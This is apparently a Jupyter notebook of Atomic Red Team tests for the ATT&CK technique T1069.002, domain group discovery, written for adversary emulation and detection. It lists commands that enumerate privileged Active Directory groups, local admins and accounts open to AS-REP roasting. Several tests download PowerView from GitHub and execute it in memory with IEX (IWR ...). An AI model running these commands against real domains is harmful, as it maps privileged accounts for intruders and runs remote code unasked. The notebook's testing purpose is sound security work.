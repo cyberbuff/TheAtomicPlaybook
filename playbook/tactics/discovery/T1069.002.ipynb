{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "14797ea6",
   "metadata": {},
   "source": "# T1069.002 - Domain Groups\nAdversaries may attempt to find domain-level groups and permission settings. The knowledge of domain-level permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as domain administrators.\n\nCommands such as <code>net group /domain</code> of the [Net](https://attack.mitre.org/software/S0039) utility,  <code>dscacheutil -q group</code> on macOS, and <code>ldapsearch</code> on Linux can list domain-level groups."
  },
  {
   "cell_type": "markdown",
   "id": "7065c379",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "3c8b26a5",
   "metadata": {},
   "source": [
    "### Atomic Test #1 - Basic Permission Groups Discovery Windows (Domain)",
    "Basic Permission Groups Discovery for Windows. This test will display some errors if run on a computer not connected to a domain. Upon execution, domain\ninformation will be displayed.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nnet localgroup\nnet group /domain\nnet group \"enterprise admins\" /domain\nnet group \"domain admins\" /domain\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "26ec6e31",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1069.002 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "b804573f",
   "metadata": {},
   "source": [
    "### Atomic Test #2 - Permission Groups Discovery PowerShell (Domain)",
    "Permission Groups Discovery utilizing PowerShell. This test will display some errors if run on a computer not connected to a domain. Upon execution, domain\ninformation will be displayed.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nget-ADPrincipalGroupMembership $env:USERNAME | select name\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "47ade277",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1069.002 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "a0c556b7",
   "metadata": {},
   "source": [
    "### Atomic Test #3 - Elevated group enumeration using net group (Domain)",
    "Runs \"net group\" command including command aliases and loose typing to simulate enumeration/discovery of high value domain groups. This\ntest will display some errors if run on a computer not connected to a domain. Upon execution, domain information will be displayed.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nnet groups \"Account Operators\" /doma\nnet groups \"Exchange Organization Management\" /doma\nnet group \"BUILTIN\\Backup Operators\" /doma\nnet group /domai \"Domain Admins\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9254083e",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1069.002 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "c99f9455",
   "metadata": {},
   "source": [
    "### Atomic Test #4 - Find machines where user has local admin access (PowerView)",
    "Find machines where user has local admin access (PowerView). Upon execution, progress and info about each host in the domain being scanned will be displayed.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-LocalAdminAccess -Verbose\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "87a1bb4f",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1069.002 -TestNumbers 4"
  },
  {
   "cell_type": "markdown",
   "id": "21d8f828",
   "metadata": {},
   "source": [
    "### Atomic Test #5 - Find local admins on all machines in domain (PowerView)",
    "Enumerates members of the local Administrators groups across all machines in the domain. Upon execution, information about each machine will be displayed.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Invoke-EnumerateLocalAdmin  -Verbose\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7754abc7",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1069.002 -TestNumbers 5"
  },
  {
   "cell_type": "markdown",
   "id": "2e8173a4",
   "metadata": {},
   "source": [
    "### Atomic Test #6 - Find Local Admins via Group Policy (PowerView)",
    "takes a computer and determines who has admin rights over it through GPO enumeration. Upon execution, information about the machine will be displayed.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-GPOComputerAdmin -ComputerName $env:COMPUTERNAME -Verbose\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d02d6d3e",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1069.002 -TestNumbers 6"
  },
  {
   "cell_type": "markdown",
   "id": "6c265d91",
   "metadata": {},
   "source": "### Atomic Test #7 - Enumerate Users Not Requiring Pre Auth (ASRepRoast)\nWhen successful, accounts that do not require kerberos pre-auth will be returned\n\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: Computer must be domain joined.\n\n##### Check Prereq Commands:\n```powershell\nif((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nWrite-Host Joining this computer to a domain must be done manually.\n\n```\n##### Description: Requires the Active Directory module for powershell to be installed.\n\n##### Check Prereq Commands:\n```powershell\nif(Get-Module -ListAvailable -Name ActiveDirectory) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nAdd-WindowsCapability -Online -Name \"Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "045b6618",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1069.002 -TestNumbers 7 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "87492f90",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nget-aduser -f * -pr DoesNotRequirePreAuth | where {$_.DoesNotRequirePreAuth -eq $TRUE}\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ca14275b",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1069.002 -TestNumbers 7"
  },
  {
   "cell_type": "markdown",
   "id": "d1ad5e4d",
   "metadata": {},
   "source": "### Atomic Test #8 - Adfind - Query Active Directory Groups\nAdfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Groups\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: AdFind.exe must exist on disk at specified location (PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe)\n\n##### Check Prereq Commands:\n```cmd\nif (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```cmd\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -Type Directory (split-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest -Uri \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/bin/AdFind.exe\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "727f118b",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1069.002 -TestNumbers 8 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "22aed720",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\n\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" -f (objectcategory=group)\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "88f74f49",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1069.002 -TestNumbers 8"
  },
  {
   "cell_type": "markdown",
   "id": "845a9304",
   "metadata": {},
   "source": [
    "### Atomic Test #9 - Enumerate Active Directory Groups with Get-AdGroup",
    "The following Atomic test will utilize Get-AdGroup to enumerate groups within Active Directory.\nUpon successful execution a listing of groups will output with their paths in AD.\nReference: https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-adgroup?view=windowsserver2022-ps\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nGet-AdGroup -Filter *\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "07411744",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1069.002 -TestNumbers 9"
  },
  {
   "cell_type": "markdown",
   "id": "c8524a53",
   "metadata": {},
   "source": [
    "### Atomic Test #10 - Enumerate Active Directory Groups with ADSISearcher",
    "The following Atomic test will utilize ADSISearcher to enumerate groups within Active Directory.\nUpon successful execution a listing of groups will output with their paths in AD.\nReference: https://devblogs.microsoft.com/scripting/use-the-powershell-adsisearcher-type-accelerator-to-search-active-directory/\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n([adsisearcher]\"objectcategory=group\").FindAll(); ([adsisearcher]\"objectcategory=group\").FindOne()\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "bf02cfdd",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1069.002 -TestNumbers 10"
  },
  {
   "cell_type": "markdown",
   "id": "d8c1aaa1",
   "metadata": {},
   "source": "### Atomic Test #11 - Get-ADUser Enumeration using UserAccountControl flags (AS-REP Roasting)\nWhen successful, accounts that do not require kerberos pre-auth will be returned.\nReference: https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html\n\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: Computer must be domain joined.\n\n##### Check Prereq Commands:\n```powershell\nif((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nWrite-Host Joining this computer to a domain must be done manually.\n\n```\n##### Description: Requires the Active Directory module for powershell to be installed.\n\n##### Check Prereq Commands:\n```powershell\nif(Get-Module -ListAvailable -Name ActiveDirectory) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nAdd-WindowsCapability -Online -Name \"Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "20ff92c5",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1069.002 -TestNumbers 11 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "471236a8",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nGet-ADUser -Filter 'useraccountcontrol -band 4194304' -Properties useraccountcontrol | Format-Table name\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "dd4ac288",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1069.002 -TestNumbers 11"
  },
  {
   "cell_type": "markdown",
   "id": "f2d2ce41",
   "metadata": {},
   "source": [
    "### Atomic Test #12 - Get-DomainGroupMember with PowerView",
    "Utilizing PowerView, run Get-DomainGroupMember to identify domain users. Upon execution, progress and info about groups within the domain being scanned will be displayed.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainGroupMember \"Domain Admins\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3e9ff361",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1069.002 -TestNumbers 12"
  },
  {
   "cell_type": "markdown",
   "id": "853875e9",
   "metadata": {},
   "source": [
    "### Atomic Test #13 - Get-DomainGroup with PowerView",
    "Utilizing PowerView, run Get-DomainGroup to identify the domain groups. Upon execution, Groups within the domain will be listed.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainGroup -verbose\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9105f66e",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1069.002 -TestNumbers 13"
  },
  {
   "cell_type": "markdown",
   "id": "e8219591",
   "metadata": {},
   "source": "### Atomic Test #14 - Active Directory Enumeration with LDIFDE\nOutput information from Active Directory to a specified file. [Ldifde](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc731033(v=ws.11)) is a CLI tool for creating, modifying and deleting directory objects.\nThe test is derived from the CISA Report on Voly Typhoon. Reference: https://media.defense.gov/2023/May/24/2003229517/-1/-1/0/CSA_Living_off_the_Land.PDF\n\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: PowerShell ActiveDirectory Module must be installed\n\n##### Check Prereq Commands:\n```cmd\nTry {\n    Import-Module ActiveDirectory -ErrorAction Stop | Out-Null\n    exit 0\n}\nCatch {\n    exit 1\n}\n\n```\n##### Get Prereq Commands:\n```cmd\nif((Get-CimInstance -ClassName Win32_OperatingSystem).ProductType -eq 1) {\n  Add-WindowsCapability -Name (Get-WindowsCapability -Name RSAT.ActiveDirectory.DS* -Online).Name -Online\n} else {\n  Install-WindowsFeature RSAT-AD-PowerShell\n}\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "fe1bd098",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1069.002 -TestNumbers 14 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "b8c6ce4a",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nldifde.exe -f C:\\Windows\\temp\\atomic_ldifde.txt -p subtree\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "45deaaca",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1069.002 -TestNumbers 14"
  },
  {
   "cell_type": "markdown",
   "id": "1d672769",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\ndel C:\\Windows\\temp\\atomic_ldifde.txt\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e4060bbd",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1069.002 -TestNumbers 14 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "6e059c1f",
   "metadata": {},
   "source": "### Atomic Test #15 - Active Directory Domain Search Using LDAP - Linux (Ubuntu)/macOS\nOutput information from LDAPSearch. LDAP Password is the admin-user password on Active Directory\n\n**Supported Platforms:** linux\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `sh`!\n##### Description: Packages sssd-ad sssd-tools realmd adcli installed and realm available, ldapsearch\n\n##### Check Prereq Commands:\n```sh\nwhich ldapsearch\n\n```\n##### Get Prereq Commands:\n```sh\necho missing ldapsearch command; exit 1\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c9bb0567",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1069.002 -TestNumbers 15 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "badae347",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nldapsearch -H ldap://example.com:389 -x -D user@example.com -w s3CurePssw0rD! -b \"CN=Users,DC=example,DC=com\" \"(objectClass=group)\" -s sub -a always -z 1000 dn \n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9b2a56f2",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1069.002 -TestNumbers 15"
  },
  {
   "cell_type": "markdown",
   "id": "7828890e",
   "metadata": {},
   "source": "## Detection\nSystem and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001)."
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "pwsh",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "pwsh",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}